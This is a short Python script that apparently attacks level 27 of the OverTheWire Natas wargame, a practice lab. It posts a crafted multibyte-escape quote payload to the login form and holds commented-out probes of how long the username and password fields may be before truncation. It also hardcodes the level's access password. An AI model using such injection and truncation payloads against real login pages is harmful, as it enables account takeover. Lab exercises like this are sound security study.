#!/usr/bin/env python3

import requests
from requests.auth import HTTPBasicAuth

uri = 'http://natas27.natas.labs.overthewire.org/'
username = 'natas27'
password = '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'

Data = {'username' : "natas26",'password' : "%bf%5c%27"}

# Making a string for the Data prefents the %-sign for getting encoded.
param_str = "&".join("%s=%s" % (k,v) for k, v in Data.items())

p = requests.post( uri,
        auth=HTTPBasicAuth(username, password),
        # data = Data)
        params=param_str)
print( "\n".join(p.text.split('\r\n')[13:-4]) )


### Small test for query overflow amount ### YES 64 chars
# Data = {'username' : "natas27",'password' : "A"*1600 + "B"}
# p = requests.post( uri,
#         auth=HTTPBasicAuth(username, password),
#         params=Data)
# print( "\n".join(p.text.split('\r\n')[13:-4]) )

# for i in range(1600,0,-1):
#     Data = {'username' : "natas27",'password' : "A"*i}
#     p = requests.post( uri,
#             auth=HTTPBasicAuth(username, password),
#             params=Data)
#     print( i )
#     if 'Wrong' not in p.text:
#         print( '\n'.join(p.text.split('\r\n')[13:-4]) )
#         break

## Same for username? ## YES
# Data = {'username' : "A"*64+"B",'password' : "A"}
# p = requests.post( uri,
#         auth=HTTPBasicAuth(username, password),
#         params=Data)
# print( "\n".join(p.text.split('\r\n')[13:-4]) )

# Data = {'username' : "A"*64,'password' : "A"}
# p = requests.post( uri,
#         auth=HTTPBasicAuth(username, password),
#         params=Data)
# print( "\n".join(p.text.split('\r\n')[13:-4]) )
